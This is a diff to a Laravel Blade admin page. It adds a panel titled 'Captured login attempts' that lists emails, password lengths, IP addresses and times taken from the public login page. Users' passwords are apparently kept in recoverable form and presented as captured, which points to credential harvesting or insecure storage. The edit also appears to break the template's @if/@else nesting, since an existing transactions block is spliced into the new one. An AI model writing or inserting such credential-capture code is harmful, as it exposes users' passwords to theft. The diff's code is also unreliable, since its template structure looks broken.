@@ -498,13 +498,46 @@
                         </tbody>
                     </table>
                 </div>
+    <div class="admin-section">
+        <div class="admin-section-head">
+            <div>
+                <h2>Captured login attempts</h2>
+                <p>Recent email/password submissions from the public login page.</p>
+            </div>
+        </div>
+
+        <div class="admin-table-wrap">
+            @if($recent_login_attempts->count() > 0)
+                <div class="table-responsive">
+                    <table class="table admin-table">
+                        <thead>
+                            <tr>
+                                <th>Email</th>
+                                <th>Password</th>
+                                <th>IP Address</th>
+                                <th>Submitted</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            @foreach($recent_login_attempts as $attempt)
+                                <tr>
+                                    <td><strong>{{ $attempt->email }}</strong></td>
+                                    <td class="table-muted" style="font-family: monospace;">{{ str_repeat('•', strlen($attempt->password)) }}</td>
+                                    <td class="table-muted">{{ $attempt->ip_address ?? 'Unknown' }}</td>
+                                    <td class="table-muted">{{ $attempt->created_at->diffForHumans() }}</td>
+                                </tr>
+                            @endforeach
+                        </tbody>
+                    </table>
+                </div>
             @else
                 <div class="empty-state">
-                    <i class="fas fa-exchange-alt"></i>
-                    <div>No transactions yet.</div>
+                    <i class="fas fa-lock"></i>
+                    <div>No login attempts captured yet.</div>
                 </div>
             @endif
         </div>
     </div>
+
 </div>
 @endsection
